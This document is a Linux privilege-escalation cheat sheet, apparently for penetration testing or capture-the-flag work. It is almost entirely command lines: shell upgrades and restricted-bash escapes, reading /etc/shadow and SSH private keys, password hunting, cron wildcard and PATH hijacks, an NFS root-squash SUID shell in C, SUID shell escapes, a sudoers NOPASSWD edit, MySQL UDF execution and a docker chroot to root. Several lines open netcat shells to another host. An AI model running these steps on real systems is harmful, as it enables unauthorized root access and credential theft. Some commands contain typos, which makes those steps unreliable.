# Big Checklist

## Spawn Interactive Shell and set env

```bash
python -c 'import pty;pty.spawn("/bin/bash");'
ctrl z
echo $TERM
stty -a
stty raw -echo
fg
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
export TERM=xterm256-color
export SHELL=bash
stty rows \\<> colums \\<>
```

## Restricted bash

```bash
perl -e 'exec "/bin/sh";'
/bin/sh -i
exec "/bin/sh";
echo os.system('/bin/bash')
/bin/sh -i
ssh user@$ip nc $localip 4444 -e /bin/sh
export TERM=xterm
```

## Automated scripts

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
```

## Check environment

```bash
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat base
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
# Check environment variables
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

## Is there a printer

```bash
lpstat -a
```

## Check any restricitions on any folders

```bash
mount -l  # any no exec or no suid?
```

## Check any unmounted drives

```bash
cat /etc/fstab
```

## Applications and services

```bash
ps aux
ps -ef
top
cat /etc/services
ps aux | grep root
ps -ef | grep root

# Installed applications - Check for vulnerable versions
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
pspy4 - to capture change in processes

# Application config files
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
```

## Jobs / CRONS

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
ls -al /var/cron.log - check timestamps
# If cron entries have relative paths, and If path is editable by user, cron entries can be hijacked by adding custom path to PATH variable
export PATH=/tmp:$PATH

# If Cron entris have wildcards, eg. tar with a (*)wildcard can be hijacked by using below on the folder
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\\ runme.sh

# Check permissions on cron binaries , overwrite possible?
# Check for frequent CRONS running in bg
# You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
# For example, to monitor every 0.1s during 1 minute, sort by less executed commands and deleting the commands that have beeing executed all the time, you can do:
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\\[" | sed '/^.\\{200\\}./d' | sort | grep -E -v "\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
# <https://github.com/DominicBreuker/pspy>
SystemD timers
systemctl list-timers -all
# watch for recently executed timers
```

## Network

```bash
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
ip a
ip addr
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

# Existing connections
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

### Cached IPs

```bash
arp -e
route
/sbin/route -nee
```

## USER and Sensitive info

```bash
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of superusers
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
```

### Check for Sensitive info

```bash
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
ls -ahlR /root/
ls -ahlR /home/
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

# SSH KEYS
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

## FileSystem

```bash
cat /etc/fstab
cat /etc/exports
mount
df -h
```

## Check for NFS no root squash on exports

Can be escalated by mounting on local system and writing an suid binary as root, root privs are not squashed

```bash
showmount -e MACHINE_IP
mkdir /tmp/1
mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

## Which configuration files can be written in /etc/? Able to reconfigure a service?

```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
```

## VAR contents

```bash
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

# HTTP ROOT / FTP ROOTs
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

## Check Application logs for sensitive data

```bash
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
```

## Find SUID Files

```bash
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search
for i in `locate -r "bin$"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker
-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null
find / perm /u=s -user "User name that you are looking for" 2>/dev/null
```

## Writable file and nobody files

```bash
find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print   # world-writeable files
find /dir -xdev \\( -nouser -o -nogroup \\) -print   # Noowner files
```

## Writable by current user

```bash
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul
```

## Any script files that we can modify?

```bash
find / -writable -type f -name "*.py" 2>/dev/null     #find all python file that can be write by us
ls -aRl / | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl / | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl / | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl / | awk '$1 ~ /w.$/' 2>/dev/null        # Other
find / -readable -type f 2>/dev/null               # Anyone
find / -readable -type f -maxdepth 1 2>/dev/null   # Anyone
```

## Any service running by root?

```bash
ps aux|grep "root"
/usr/bin/journalctl (Which is normally not readable by a user) << cron job?
```

## Find password

```bash
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

## Interesting files

```bash
# Files modified in the last 5 mins
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

## Sqlite DB files

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

## Find all hidden files

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

## Scripts in PATH

```bash
for d in `echo $PATH | tr ":" "\\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\\n"`; do find $d -type -f -executable 2>/dev/null; done
```

## Backup files

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \\( -name "*backup*" -o -name "*\\.bak" -o -name "*\\.bck" -o -name "*\\.bk" \\) 2>/dev/null
```

## SUID

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null
# Check GTFOBins
```

## Is suid bit set on these applications?

```bash
Nmap
    nmap -V     <Nmap version 2.02 - 5.21 had an interactive mode
    nmap --interactive
    nmap> !sh

Vim
    Modify system file, e.g. passwd?

    vim.tiny
    - Press ESC key
    :set shell=/bin/sh
    :shell

find
    touch pentestlab
    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \\;

Bash
    bash -p

More

Less
    less /etc/passwd
    !/bin/sh
Nano
    Can you modify system file?
    Modify /etc/suoders
    \\<user> ALL=(ALL) NOPASSWD:ALL

cp
    Use cp to overwrite passwd with a new password
```

## Linux capability

```bash
find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null
getcap -r /
getcap -r / 2>/dev/null
# If we find cap_dac_read_search # read anything
# cap_setuid+ep # setuid
google that capability on how it can help us get root
```

## Mysql run by root

```bash
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library
<https://www.exploit-db.com/exploits/1518/>
You can also try
select sys_exec('echo test>/tmp/test.txt');
select sys_eval('echo test>/tmp/test.txt');
```

## Docker group

```bash
#<https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17>
docker run -it --volume /:/mnt alpine:latest chroot /mnt
Overwite etc/passwd inside docker to gain root
```